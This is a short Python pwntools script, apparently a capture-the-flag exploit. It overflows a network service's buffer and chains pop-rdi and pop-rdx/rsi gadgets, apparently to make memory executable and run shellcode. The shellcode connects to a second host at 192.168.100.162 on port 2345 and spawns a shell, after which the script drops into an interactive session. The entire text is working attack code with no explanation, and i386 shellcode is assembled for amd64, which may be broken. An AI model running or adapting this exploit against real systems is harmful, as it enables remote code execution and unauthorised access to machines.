from pwn import *

HOST = ""
PORT = 31337
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s1 = remote('192.168.33.10',PORT)
assembly  = shellcraft.i386.linux.connect('192.168.100.162', 2345, 'ipv4')
assembly += shellcraft.i386.linux.findpeersh(2345)
shellcode = asm(assembly,arch='amd64')
raw_input()
s1.send("\x02"+"ABCD")
s1.recv()

s1.send(p32(0xffff))
gadget1 = 0x00000000004006e6 # pop rdi ; ret
gadget2 = 0x0000000000405db9 # pop rdx ; pop rsi ; ret

dat = p64(gadget1)
dat += p64(0x6D6000)
dat += p64(gadget2)
dat += p64(0x7)
dat += p64(0x10000)
dat += p64(0x044F410)
dat += p64(0x6D6960)
s1.send(shellcode+"A"*(0x480-len(shellcode))+p64(0x41414141)+dat+"A"*0x500)

s1.interactive()
